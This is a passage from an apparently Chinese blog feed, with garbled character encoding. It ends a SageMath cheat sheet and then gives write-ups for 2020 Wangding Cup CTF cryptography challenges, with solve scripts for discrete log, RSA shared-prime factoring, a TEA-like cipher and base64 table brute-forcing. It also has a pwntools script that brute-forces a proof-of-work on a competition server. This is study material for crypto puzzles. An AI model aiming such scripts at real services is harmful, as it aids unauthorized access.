PolynomialRing(GF(5), 3, â€˜xyzâ€™)</p><p>eg:</p><figure class="highlight parser3"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">sage: R.<span class="tag">&lt;<span class="name">x,y</span>&gt;</span> = RationalField()[]</span></span><br><span class="line"><span class="xml">sage: f = (x</span><span class="keyword">^3</span><span class="xml"> +</span><span class="number">2</span><span class="xml">*y</span><span class="keyword">^2</span><span class="xml">*x)</span><span class="keyword">^2</span><span class="xml"></span></span><br><span class="line"><span class="xml">sage: g = x</span><span class="keyword">^2</span><span class="xml">*y</span><span class="keyword">^2</span><span class="xml"></span></span><br><span class="line"><span class="xml">sage: f.gcd(g)</span></span><br><span class="line"><span class="xml">x</span><span class="keyword">^2</span><span class="xml"></span></span><br><span class="line"><span class="xml">sage: gcd(f,g)</span></span><br><span class="line"><span class="xml">x</span><span class="keyword">^2</span><span class="xml"></span></span><br></pre></td></tr></table></figure><h2 id="æ•°è®º"><a href="#æ•°è®º" class="headerlink" title="æ•°è®º"></a>æ•°è®º</h2><p>sage: R = IntegerModRing(97)     or     R = Zmod(97)        #å®šä¹‰æ¨¡æ•°ä¸º97çš„ç¯</p><p>sage: a = R(2) / R(3)         #ç¯ä¸Šçš„é™¤æ³•</p><p>sage: a.is_square()        #æ˜¯å¦ä¸ºäºŒæ¬¡å‰©ä½™</p><p>sage: gcd(3,2)        #æœ€å¤§å…¬å› æ•°</p><p>sage: factorial(5)        #é˜¶ä¹˜</p><p>sage: next_prime()        #åä¸€ä¸ªç´ æ•°</p><p>sage: previous_prime()        #å‰ä¸€ä¸ªç´ æ•°</p><p>sage: divisors()     #æ‰€æœ‰å› å­</p><p>sage: sigma(n,k)    #nçš„æ‰€æœ‰å› å­çš„kæ¬¡å¹‚ä¹‹å’Œ</p><p>sage: inverse_mod(a,n)    #æ±‚é€†</p><p>ä¸¤ç§å› å¼åˆ†è§£</p><p>sage: factor(1024)        -&gt;    2^10<br>sage: prime_divisors(1024)        -&gt;    [2]</p><p>æœ‰é™åŸŸä¸‹å¼€æ ¹</p><p>sage: R.&lt;X&gt; = PolynomialRing(Zmod(p))</p><p>sage: f = x^256 - c</p><p>sage: f.monic().roots()</p><p>sage: euler_phi(n)        #æ±‚nçš„æ¬§æ‹‰å‡½æ•°        sage: phi = n*prod([1 - 1/p for p in prime divisors(n)]); </p><p>sage: crt(m1,m2,n1,n2)        #ä¸­å›½å‰©ä½™å®šç† ã€x % n1 = m1; x % n2 = m3ã€‘</p><h2 id="Elliptic-Curves"><a href="#Elliptic-Curves" class="headerlink" title="Elliptic Curves"></a>Elliptic Curves</h2><p> EllipticCurve(R, [a1, a2, a3, a4, a6]) eg:</p><p>sage: ecc = EllipticCurve(GF(q), [a,b])        #åˆå§‹åŒ–ä¸€æ¡çº¿</p><p>sage: G = ecc(x,y)        #é€‰å®šå…¶ä¸Šçš„ä¸€ä¸ªç‚¹</p><p>sage: G.order()        #Gç‚¹çš„é˜¶</p>]]></content>
      
      
      <categories>
          
          <category> å·¥å…·å°å±‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Sage </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 ç½‘é¼æ¯</title>
      <link href="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF/"/>
      <url>/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="é’é¾™ç»„"><a href="#é’é¾™ç»„" class="headerlink" title="é’é¾™ç»„"></a>é’é¾™ç»„</h1><h2 id="boom"><a href="#boom" class="headerlink" title="boom"></a>boom</h2><p><code>first:this string md5:46e5efe6165a5afb361217446a2dbd01</code></p><p>å»<a href="chamd5.org">åœ¨çº¿ç½‘ç«™</a>æŸ¥å¾—:en5oy</p><p><code>This time:Here are have some formulas 3x-y+z=1852x+3y-z=321x+y+z=173input: x =</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var(&apos;x y z&apos;)</span><br><span class="line">solve([3*x-y+z==185,2*x+3*y-z==321,x+y+z==173],[x,y,z])</span><br></pre></td></tr></table></figure><p><code>Last time: Kill itx*x+x - 7943722218936282 = 0input x:</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">var</span><span class="params">(<span class="string">'x'</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">solve</span><span class="params">([x * x + x - <span class="number">7943722218936282</span> == <span class="number">0</span>],[x])</span></span></span><br></pre></td></tr></table></figure><h2 id="you-raise-me-up"><a href="#you-raise-me-up" class="headerlink" title="you raise me up"></a>you raise me up</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line">from Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> <span class="built_in">random</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">2</span> ** <span class="number">512</span></span><br><span class="line">m = <span class="built_in">random</span>.randint(<span class="number">2</span>, n<span class="number">-1</span>) | <span class="number">1</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, bytes_to_long(flag), n)</span><br><span class="line"><span class="built_in">print</span> <span class="string">'m = '</span> + str(m)</span><br><span class="line"><span class="built_in">print</span> <span class="string">'c = '</span> + str(c)</span><br><span class="line"></span><br><span class="line"><span class="meta"># m = 391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span></span><br><span class="line"><span class="meta"># c = 6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span></span><br></pre></td></tr></table></figure><p>é¢˜ä¸­æˆ‘ä»¬çš„flagåœ¨mçš„æŒ‡æ•°ä½ç½®ï¼Œæ‰€ä»¥è¿™é¢˜æ˜¯è§£ä¸€ä¸ªDLP(ç¦»æ•£å¯¹æ•°é—®é¢˜)</p><p>å‘ç°é¢˜ä¸­çš„n = 2 ** 512ï¼Œ æ‰€ä»¥phi(n) =  2 ** 511ï¼›å³æœ¬é¢˜æ¨¡æ•°çš„æ¬§æ‹‰å‡½æ•°å…·æœ‰smoothçš„æ€§è´¨ï¼Œå³å…¶æ˜¯ç”±å¾ˆå¤šå°ç´ æ•°ä¹˜ç§¯è€Œæ¥ï¼Œæ‰€ä»¥å¯ç”¨Pohlig Hellman ç®—æ³•æ¥è§£å†³è¿™ä¸ªDLPï¼Œsageçš„discrete_logç”¨çš„æ–¹æ³•å°±åŒ…æ‹¬Pohlig Hellmanç®—æ³•ï¼Œexpï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">m = 391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span><br><span class="line">c = 6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span><br><span class="line">n = 2 ** 512</span><br><span class="line">m = Mod(m,n)</span><br><span class="line">c = Mod(c,n)</span><br><span class="line">discrete_log(c,m)</span><br></pre></td></tr></table></figure><h2 id="easy-ya"><a href="#easy-ya" class="headerlink" title="easy_ya"></a>easy_ya</h2><p>é¢˜ç›®ä»£ç </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span><span class="built_in"> secret </span>import flag,key</span><br><span class="line"><span class="keyword">from</span> random import randint</span><br><span class="line"><span class="keyword">from</span> libnum import n2s,s2n</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number import getPrime</span><br><span class="line">limit = lambda n: n &amp; 0xffffffff</span><br><span class="line"><span class="attribute">padding</span>=<span class="string">"\xe6\xe6\xe7\xe6\xe5\xe6\xe5\xe9\xe5"</span></span><br><span class="line"><span class="attribute">ek</span>=<span class="string">'\xe6\x84\xbf'</span></span><br><span class="line">def encode(key,data):</span><br><span class="line">    pad  = randint(0x10000000,0xffffffff)</span><br><span class="line">    Key  = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> key]</span><br><span class="line">    Data = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> data]</span><br><span class="line">    a = limit((Key[0] &lt;&lt; 24) | (Key[1] &lt;&lt; 16) | (Key[2] &lt;&lt; 8) | Key[3])</span><br><span class="line">    b = limit((Key[4] &lt;&lt; 24) | (Key[5] &lt;&lt; 16) | (Key[6] &lt;&lt; 8) | Key[7])</span><br><span class="line">    c = limit((Key[8] &lt;&lt; 24) | (Key[9] &lt;&lt; 16) | (Key[10] &lt;&lt; 8) | Key[11])</span><br><span class="line">    d = limit((Key[12] &lt;&lt; 24) | (Key[13] &lt;&lt; 16) | (Key[14] &lt;&lt; 8) | Key[15])</span><br><span class="line">    y = limit((Data[0] &lt;&lt; 24) | (Data[1] &lt;&lt; 16) | (Data[2] &lt;&lt; 8) | Data[3])</span><br><span class="line">    z = limit((Data[4] &lt;&lt; 24) | (Data[5] &lt;&lt; 16) | (Data[6] &lt;&lt; 8) | Data[7])</span><br><span class="line">    pads = 0</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(32):</span><br><span class="line">        pads = limit(pads + pad)</span><br><span class="line">        y = limit( y + ((z<span class="number">*16</span> + a) ^ (z + pads) ^ ((z&gt;&gt;5) + b)))</span><br><span class="line">        z = limit( z + ((y<span class="number">*16</span> + c) ^ (y + pads) ^ ((y&gt;&gt;5) + d)))</span><br><span class="line">    <span class="builtin-name">print</span> hex((y &lt;&lt; 52) ^ (pads &lt;&lt; 20) ^ z)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pow_check()</span></span><br><span class="line"><span class="comment">#token_check()</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">flag</span>=flag.ljust(len(flag)+(-len(flag)&amp;7),'\x00')</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0,len(flag)/8):</span><br><span class="line">    encode(key,flag[8*i:8*i+8])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(9):</span><br><span class="line">    ek+=padding[i] + key[2*i:2*i+2]</span><br><span class="line"></span><br><span class="line"><span class="attribute">p</span>=getPrime(2048)</span><br><span class="line"><span class="attribute">e</span>=0x10001</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(2):</span><br><span class="line">    <span class="attribute">q</span>=getPrime(2048)</span><br><span class="line">    <span class="attribute">n</span>=p*q</span><br><span class="line">    <span class="builtin-name">print</span> n</span><br><span class="line">    <span class="builtin-name">print</span> pow(s2n(ek),e,n)</span><br></pre></td></tr></table></figure><p>æ˜¾ç„¶ï¼Œæˆ‘ä»¬ç¬¬ä¸€æ­¥éœ€è¦å»äº¤äº’ï¼Œæ‹¿åˆ°å››ä¸ªå¤§æ•°ï¼Œå…¶ä¸­ä¸¤ä¸ªæ˜¯æœ‰å…¬å› å­pçš„å¤§æ•°nï¼Œè¿˜æœ‰ä¸¤ä¸ªå°±æ˜¯ekçš„å¯†æ–‡ã€‚è¿™ä¸€æ­¥å°±æ˜¯å‡‘æ•°çš„partï¼Œæ²¡ç‚¹è¥å…»ã€‚<del>åæ§½ï¼Œäº¤äº’çš„æ—¶å€™ä»€ä¹ˆæ²™é›•PoWï¼Œæœ‰å¿…è¦å¡è¿™ä¸ªå˜›</del></p><p>ç ´PoWçš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">sh = remote(<span class="string">"39.96.90.217"</span>,<span class="string">"17497"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"x[:20] = "</span>)</span><br><span class="line">pa = sh.recv(len(<span class="string">'f91a551dfa31e47458df'</span>))</span><br><span class="line">sh.recvuntil(<span class="string">'openssl_sha'</span>)</span><br><span class="line">fun = sh.recvuntil(<span class="string">"&gt;"</span>)[:<span class="number">-1</span>]</span><br><span class="line">sh.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">table = string.printable</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getpow</span><span class="params">(fun,mess)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> table:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> table:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> table:</span><br><span class="line">                    password=i+j+k+l</span><br><span class="line">                    <span class="keyword">if</span> fun == <span class="string">"256"</span>:</span><br><span class="line">                        <span class="keyword">if</span> hashlib.sha256(password.encode()).hexdigest()[:<span class="number">20</span>] == mess:</span><br><span class="line">                            <span class="keyword">return</span> i+j+k+l</span><br><span class="line">                    <span class="keyword">elif</span> fun == <span class="string">"384"</span>:</span><br><span class="line">                        <span class="keyword">if</span> hashlib.sha384(password.encode()).hexdigest()[:<span class="number">20</span>] == mess:</span><br><span class="line">                            <span class="keyword">return</span> i+j+k+l</span><br><span class="line">                    <span class="keyword">elif</span> fun == <span class="string">"1"</span>:</span><br><span class="line">                        <span class="keyword">if</span> hashlib.sha1(password.encode()).hexdigest()[:<span class="number">20</span>] == mess:</span><br><span class="line">                            <span class="keyword">return</span> i+j+k+l</span><br><span class="line">                    <span class="keyword">elif</span> fun == <span class="string">"512"</span>:</span><br><span class="line">                        <span class="keyword">if</span> hashlib.sha512(password.encode()).hexdigest()[:<span class="number">20</span>] == mess:</span><br><span class="line">                            <span class="keyword">return</span> i+j+k+l</span><br><span class="line">                    <span class="keyword">elif</span> fun == <span class="string">"224"</span>:</span><br><span class="line">                        <span class="keyword">if</span> hashlib.sha224(password.encode()).hexdigest()[:<span class="number">20</span>] == mess:</span><br><span class="line">                            <span class="keyword">return</span> i+j+k+l</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        print(fun)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"no ans"</span>)</span><br><span class="line">                        </span><br><span class="line">sh.sendline(getpow(fun,pa))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>ç„¶ä¹æˆ‘ä»¬è¾“å…¥tokenï¼Œæ‹¿åˆ°è‡ªå·±çš„data</p><p>è§£å¾—ek</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import *</span><br><span class="line">n1 = </span><br><span class="line">n2=</span><br><span class="line">p = gcd(n1,n2)</span><br><span class="line">q1 = n1//p</span><br><span class="line">q2 = n2//p</span><br><span class="line">assert n1 == p*q1</span><br><span class="line">assert n2 == p*q2</span><br><span class="line">c1 = </span><br><span class="line">e = 65537</span><br><span class="line">phi = (p-1)*(q2-1)</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">m = pow(c2,d,n2)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;æ„¿æˆ‘æ‰€çˆ±æ— å¿§æ™å²é•¿å®‰</span><br></pre></td></tr></table></figure><p>python2ä¸‹ä¼šå¾—åˆ°è¿™ä¹ˆä¸ªekï¼Œæœ‰ç‚¹æ„æ€å—·ï¼Œ<del>ä½†ä½ è¿˜æ˜¯æ²™é›•å‡ºé¢˜äººï¼Œè°è®©ä½ ç”¨PoWå¡æˆ‘</del></p><p>python3è¿è¡Œå¾—åˆ°<code>b&#39;\xe6\x84\xbf\xe6\x88\x91\xe6\x89\x80\xe7\x88\xb1\xe6\x97\xa0\xe5\xbf\xa7\xe6\x81\x99\xe5\xb2\x81\xe9\x95\xbf\xe5\xae\x89&#39;</code></p><p>ç„¶åå»æ‰è¯¥å»çš„å°±èƒ½å¾—åˆ°keyäº†<code>&#39;\x88\x91\x89\x80\x88\xb1\x97\xa0\xbf\xa7\x81\x99\xb2\x81\x95\xbf\xae\x89&#39;</code></p><p>ç„¶åå°±æ˜¯é€†è¿™ä¸ªencodeäº†ã€‚</p><p>å…¶ä¸­æˆ‘ä»¬äº¤äº’çš„æ—¶å€™æ‹¿åˆ°äº”ç»„å¯†æ–‡ï¼Œæ˜“å¾—ï¼Œæ¯ç»„å¯†æ–‡ä¸­ï¼Œä¿å­˜äº†encodeä¸­32è½®åŠ å¯†åçš„å®Œæ•´çš„yï¼Œpadså’Œæœ‰ä¸€éƒ¨åˆ†é‡åˆã€‚ä½†æ˜¯padsåŠ äº†32æ¬¡padåï¼Œæœ€å5ä½å·²ç»å˜æˆ0äº†ã€‚æ‰€ä»¥zæˆ‘ä»¬å¯ä»¥çŸ¥é“20+5 = 25ä½ï¼Œå‰©ä¸‹ä¸ƒä½æœªçŸ¥ã€‚</p><p>ç„¶åæˆ‘ä»¬å°±å»çˆ†padï¼Œæˆ‘ä»¬ä»å¯†æ–‡é‡Œå¤´èƒ½çŸ¥é“padçš„52-32=20ä½ã€‚ä½†è¿™20ä½å…¶å®æ˜¯ä¸­é—´éƒ¨åˆ†çš„ã€‚æœ€é«˜çš„5ä½å·²ç»è¢«limitææ²¡æ‰äº†ã€‚ç„¶åæœ€ä½çš„7ä½æˆ‘ä»¬ä¹Ÿæ˜¯ä¸çŸ¥é“çš„ã€‚æ‰€ä»¥ï¼Œï¼Œï¼Œçˆ†ã€‚æˆ‘ä»¬çˆ†äº†ä½7ä½çš„åŒæ—¶ï¼Œä¹Ÿèƒ½ç¡®å®šä¸€ä¸ªzï¼Œç„¶åååŠ å¯†çœ‹ç»“æœå’¯ã€‚</p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">limit = <span class="keyword">lambda</span> n: n &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">'\x88\x91\x89\x80\x88\xb1\x97\xa0\xbf\xa7\x81\x99\xb2\x81\x95\xbf\xae\x89'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">(key)</span>:</span></span><br><span class="line">    Key  = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> key]</span><br><span class="line">    <span class="comment">#Data = [ord(i) for i in data]</span></span><br><span class="line">    a = limit((Key[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (Key[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (Key[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | Key[<span class="number">3</span>])</span><br><span class="line">    b = limit((Key[<span class="number">4</span>] &lt;&lt; <span class="number">24</span>) | (Key[<span class="number">5</span>] &lt;&lt; <span class="number">16</span>) | (Key[<span class="number">6</span>] &lt;&lt; <span class="number">8</span>) | Key[<span class="number">7</span>])</span><br><span class="line">    c = limit((Key[<span class="number">8</span>] &lt;&lt; <span class="number">24</span>) | (Key[<span class="number">9</span>] &lt;&lt; <span class="number">16</span>) | (Key[<span class="number">10</span>] &lt;&lt; <span class="number">8</span>) | Key[<span class="number">11</span>])</span><br><span class="line">    d = limit((Key[<span class="number">12</span>] &lt;&lt; <span class="number">24</span>) | (Key[<span class="number">13</span>] &lt;&lt; <span class="number">16</span>) | (Key[<span class="number">14</span>] &lt;&lt; <span class="number">8</span>) | Key[<span class="number">15</span>])</span><br><span class="line">    <span class="keyword">return</span> (a,b,c,d)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#y = limit((Data[0] &lt;&lt; 24) | (Data[1] &lt;&lt; 16) | (Data[2] &lt;&lt; 8) | Data[3])</span></span><br><span class="line">    <span class="comment">#z = limit((Data[4] &lt;&lt; 24) | (Data[5] &lt;&lt; 16) | (Data[6] &lt;&lt; 8) | Data[7])</span></span><br><span class="line"></span><br><span class="line">(a,b,c,d)=init(key)</span><br><span class="line">ans = <span class="number">0x9d98a72f5c82c26680a65</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">"flag&#123;0123456789bcde-_&#125;\x00"</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ans <span class="keyword">in</span> [<span class="number">0xcf4add0cf5469a49d19c</span>,</span><br><span class="line"><span class="number">0xcccd38faa373af5059b5f</span>,</span><br><span class="line"><span class="number">0xad0e355d4d8b1cc9771d1</span>,</span><br><span class="line"><span class="number">0x703ccca78d36e770d0613</span>,</span><br><span class="line"><span class="number">0x54e05275b03e2cdedc053</span>]:</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">8</span>):</span><br><span class="line">            y = ans &gt;&gt; <span class="number">52</span><span class="comment">#å–y</span></span><br><span class="line">            mix = ans &amp; (<span class="number">2</span>**<span class="number">52</span><span class="number">-1</span>)<span class="comment">#å‰©ä¸‹çš„ä¸ºä¸ç¡®å®šzå’Œpadæ··åˆ</span></span><br><span class="line">            pads_true = mix &gt;&gt; <span class="number">32</span><span class="comment">#æ‹¿åˆ°padçš„æœ‰æ•ˆçš„20ä½</span></span><br><span class="line">            source_pad = (h&lt;&lt;<span class="number">27</span>)| (pads_true&lt;&lt;<span class="number">7</span>)| l<span class="comment">#çˆ†ç ´pad</span></span><br><span class="line">            z = limit(mix ^ (source_pad&lt;&lt;<span class="number">25</span>))<span class="comment">#æ ¹æ®çŒœçš„padï¼Œç„¶åmixä¸­padå’Œzçš„æ··åˆéƒ¨åˆ†ï¼Œç¡®å®šz</span></span><br><span class="line">            <span class="keyword">for</span> round <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">                pads = limit(source_pad*(<span class="number">32</span>-round))<span class="comment">#æ ¹æ®encodeæ¥ç”¨pads</span></span><br><span class="line">                z = limit( z - ((y*<span class="number">16</span> + c) ^ (y + pads) ^ ((y&gt;&gt;<span class="number">5</span>) + d)))<span class="comment">#åŠ å¯†å‡½æ•°åä¸€ä¸‹</span></span><br><span class="line">                y = limit( y - ((z*<span class="number">16</span> + a) ^ (z + pads) ^ ((z&gt;&gt;<span class="number">5</span>) + b)))</span><br><span class="line">            flag = (y&lt;&lt;<span class="number">32</span>)+z</span><br><span class="line">            <span class="comment">#print flag</span></span><br><span class="line">            <span class="keyword">if</span> check(long_to_bytes(flag)):<span class="comment">#æ ¹æ®flagçš„å¯èƒ½å­—ç¬¦æ¥åˆ¤æ–­å’¯</span></span><br><span class="line">                print(long_to_bytes(flag))</span><br></pre></td></tr></table></figure><h1 id="ç™½è™ç»„"><a href="#ç™½è™ç»„" class="headerlink" title="ç™½è™ç»„"></a>ç™½è™ç»„</h1><h2 id="b64"><a href="#b64" class="headerlink" title="b64"></a>b64</h2><p>æ¢è¡¨base64ï¼Œå°†ç»™å‡ºå¯¹åº”å…³ç³»è®°ä¸‹æ¥ï¼Œå‘ç°flagå¯†æ–‡ä¸­[â€˜Eâ€™, â€˜Gâ€™, â€˜Iâ€™, â€˜sâ€™, â€˜Xâ€™, â€˜zâ€™]ï¼Œè¿™å…­ä¸ªå­—ç¬¦æ²¡æœ‰æ˜ å°„å…³ç³»ã€‚</p><p>ç„¶åæœ‰[â€˜+â€™, â€˜/â€˜, â€˜1â€™, â€˜5â€™, â€˜7â€™, â€˜6â€™, â€˜9â€™, â€˜8â€™, â€˜Aâ€™, â€˜Câ€™, â€˜Hâ€™, â€˜Kâ€™, â€˜Jâ€™, â€˜Pâ€™, â€˜Râ€™, â€˜Vâ€™, â€˜eâ€™, â€˜fâ€™, â€˜nâ€™, â€˜uâ€™, â€˜wâ€™, â€˜vâ€™] è¿™ä¹ˆå¤šä½å­—ç¬¦ä¹Ÿæ²¡æœ‰è¢«æ˜ å°„ã€‚</p><p>æ‰€ä»¥çˆ†ç ´è¿™ä¸¤ä¸ªåˆ—è¡¨ä¸­çš„æ˜ å°„å…³ç³»</p><p>ç„¶åæ ¹æ®flagçš„æ ¼å¼ï¼Œuuidï¼Œæ¥åˆ¤æ–­ç»“æœã€‚</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 